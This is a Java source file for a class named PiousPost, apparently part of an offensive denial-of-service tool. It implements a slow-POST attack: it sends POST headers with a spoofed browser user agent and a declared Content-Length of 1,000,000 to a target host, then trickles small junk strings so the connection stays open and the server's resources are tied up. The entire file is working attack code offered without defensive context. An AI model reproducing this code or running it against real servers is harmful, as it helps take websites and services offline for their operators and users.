package m3rlin.p0st;

import java.io.IOException;

import org.apache.log4j.Logger;

import m3rlin.a77ack.Attack;

public class PiousPost extends Attack {
	
	private static Logger log = Logger.getLogger(PiousPost.class);
	
	public PiousPost(String hostname, int port, int interval) {
		super(hostname, port, interval);
	}
	
	public void writeHeaders() throws IOException {
		log.debug("Writing headers to socket...");
		writer.write("POST / HTTP/1.1\r\n");
		writer.write("Host: " + hostname + " \r\n");
		writer.write("User-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
		writer.write("Content-Length: 1000000\r\n");
		writer.write("Connection:close\r\n");
		writer.write("\r\n");
		writer.flush();
	}
	
	public void attack() throws IOException {
		log.debug("Writing data to socket...");
		writer.write("h4x0r|h4x0r|h4x0r|h4x0r");
		writer.flush();
	}
}